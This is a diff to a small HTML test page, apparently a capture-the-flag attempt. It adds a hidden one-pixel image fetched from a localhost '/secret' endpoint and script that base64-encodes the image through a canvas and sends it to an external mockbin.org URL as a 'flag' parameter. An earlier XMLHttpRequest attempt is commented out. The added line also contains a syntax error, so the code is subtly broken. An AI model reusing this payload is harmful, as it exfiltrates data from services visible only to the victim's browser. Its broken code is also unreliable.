@@ -5,8 +5,32 @@
     <title>test</title>
   </head>
   <body>
-  	
+  <img id="ttt" src="http://127.0.0.1:8080/secret" style="width:1px;height:1px;">	
     <script>
+function getBase64Image(img) {
+    // Create an empty canvas element
+    var canvas = document.createElement("canvas");
+    canvas.width = img.width;
+    canvas.height = img.height;
+
+    // Copy the image contents to the canvas
+    var ctx = canvas.getContext("2d");
+    ctx.drawImage(img, 0, 0);
+
+    // Get the data-URL formatted image
+    // Firefox supports PNG and JPEG. You could check img.src to
+    // guess the original format, but be aware the using "image/jpg"
+    // will re-encode the image.
+    var dataURL = canvas.toDataURL("image/png");
+
+    return dataURL.replace(/^data:image\/(png|jpg);base64,/, "");
+}
+
+  	var img = document.createElement('img');
+	img.src = "http://mockbin.org/bin/21c6f9aa-c551-4717-bc2c-b63516eb13ab?flag=" + getBase64Image(document.getElementById("ttt"););
+	document.body.appendChild(img);
+    
+    /*
     	var xmlHttp = new XMLHttpRequest();
 	if (xmlHttp) {
 		console.log("starting http requ");
@@ -21,6 +45,7 @@
 	    };
 	    xmlHttp.send(null);
 	}
+	*/
     </script>
   </body>
 </html> 
